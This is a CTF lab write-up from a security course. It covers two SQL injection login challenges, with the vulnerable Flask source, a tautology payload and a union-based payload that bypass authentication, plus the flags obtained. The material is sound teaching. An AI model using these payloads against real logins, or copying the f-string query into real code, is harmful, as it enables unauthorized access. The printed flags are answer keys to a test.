---
title: Simple Web 0x03(Lab - Log me in + Revenge)
tags: [NTUSTWS, CTF, Web]

category: "Security Course｜NTUST WS｜SQL Injection"
date: 2023-12-08
---

# Simple Web 0x03(Lab - Log me in + Revenge)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8200/
Challenge: http://h4ck3r.quest:8201/

## Exploit - `SQLi`
* Payload → `') or ('1'='1') -- #`
SELECT * FROM admin WHERE (username='') or ('1'='1') -- #') AND (password='MTIz')

Flag: `FLAG{b4by_sql_inj3cti0n}`

## Revenge source code
:::spoiler code
```python!=
from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/database.db')
        db.row_factory = sqlite3.Row
    return db


@app.before_first_request
def init_db():
    cursor = get_db().cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS "admin" (
        "username"  TEXT NOT NULL,
        "password"  TEXT NOT NULL
    )
    """)
    cursor.execute("SELECT COUNT(*) as count FROM admin WHERE username='admin'")
    count = cursor.fetchone()['count']
    if count == 0:
        import secrets
        cursor.execute("INSERT INTO admin (username, password) VALUES (?,?)",
                       ('admin', secrets.token_urlsafe()))
    get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route("/")
def home():
    return render_template("index.html",
                           failed=request.args.get('failed') != None)


@app.route("/login", methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return redirect("/?failed")

    cur = get_db().execute(f"SELECT * FROM admin WHERE (username='{username}')")
    res = cur.fetchone()
    cur.close()

    if res['username'] == 'admin' and res['password'] == password:
        return "FLAG: FLAG{<REDACTED>}"

    return redirect("/?failed")



@app.route("/source")
def source():
    import re
    source_code = open(__file__).read()
    source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{<REDACTED>}', source_code, 1)
    return Response(source_code, mimetype='text/plain')


if __name__ == '__main__':
    app.run(debug=True)

```
:::

## Exploit - `SQLi` + union syntax
1. Observe source code first
It must receive username and password together, or failed otherwise. Thus, we can not use previous payload.
2. Union syntax
Username Payload → `') union select 'admin', 'password' -- #`
Password → `password`
<font color="FF000">SELECT * FROM admin WHERE (username='') union select 'admin', 'password' -- #')</font>

Flag: `FLAG: FLAG{un10n_bas3d_sqli}`

